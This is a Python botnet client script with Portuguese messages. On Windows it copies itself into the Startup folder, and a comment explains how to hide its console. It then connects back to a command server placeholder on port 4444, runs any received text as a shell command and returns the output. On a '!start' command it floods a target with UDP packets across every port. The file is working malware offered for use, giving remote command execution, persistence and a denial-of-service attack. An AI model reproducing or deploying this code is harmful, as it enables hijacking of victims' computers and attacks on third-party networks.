import os, sys

if (os.name == 'nt'):
    os.system("copy \""+str(sys.argv[0])+"\" \"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\"")

'''
use extension .pyw to hide console

or use this code for windows systems

if (os.name == 'nt'):
	import win32gui, win32con

	the_program_to_hide = win32gui.GetForegroundWindow()
	win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)
'''

import socket, subprocess, random, threading, platform, time

server = "<your-server>"
port = 4444

stop = 2

mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def sock_connect():

	while(True):
		if (not mysocket.connect_ex((server, port))):
			break
		time.sleep(60)

sock_connect()

def ddos_attack(target):

	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	bytes = random._urandom(1490)
	sent = 0
	port = 1
	
	mysocket.send(("[+] Ataque iniciado em um bot.").encode('utf-8'))	

	while (stop == 0):
		sock.sendto(bytes, (target,port))
		sent = sent + 1
		#print ("Sent %s packet to %s throught port:%s"%(sent,target,port))
		port = port + 1
		if port == 65536:
			port = 1

while True:
	try:
		cmd = (mysocket.recv(1024)).decode()

		if ('!start' in cmd):
			target = cmd[7:]
			stop = 0
			thread = threading.Thread(target=ddos_attack, args=(target,))
			thread.start()
			#ddos_attack(target)
		elif ('!stop' in cmd):
			stop = 1
			mysocket.send(("[+] Ataque parado em um bot.").encode('utf-8'))
		else:
			p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			stdout, stderr = p.communicate()

			#output = "->"+(os.popen(cmd).read())
			
			if (stdout and stdout != ''):
				mysocket.send(stdout)
			elif(not stdout and stderr != ''):
				mysocket.send(("Erro: "+(stderr.decode('ISO-8859-1'))).encode('ISO-8859-1'))
			else:
				mysocket.send(("Nao houve resposta.").encode('ISO-8859-1'))

			#mysocket.send(output.encode('utf-8'))

	except Exception as e:
		msg = "Erro no lado do client:" + str(e)
		mysocket.send(msg.encode('utf-8'))
		
		